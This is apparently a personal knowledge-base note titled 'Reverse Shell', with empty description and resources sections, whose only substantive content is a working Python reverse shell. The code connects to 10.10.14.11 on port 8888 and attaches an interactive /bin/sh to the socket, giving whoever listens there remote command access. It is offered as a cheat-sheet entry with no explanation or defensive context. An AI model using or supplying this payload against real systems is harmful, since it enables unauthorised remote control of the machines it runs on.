---
creation date: May 30th 2023
last modified date: May 30th 2023
aliases: []
tags: #📕
---

Primary Categories: 
Secondary Categories:  
Links: 
Search Tag: #📕  

# [[Reverse Shell]]  
___

## Description:  


## List  of a few shells
### Python
```python
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.11",8888));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```




___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: May 30th 2023 (10:53 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
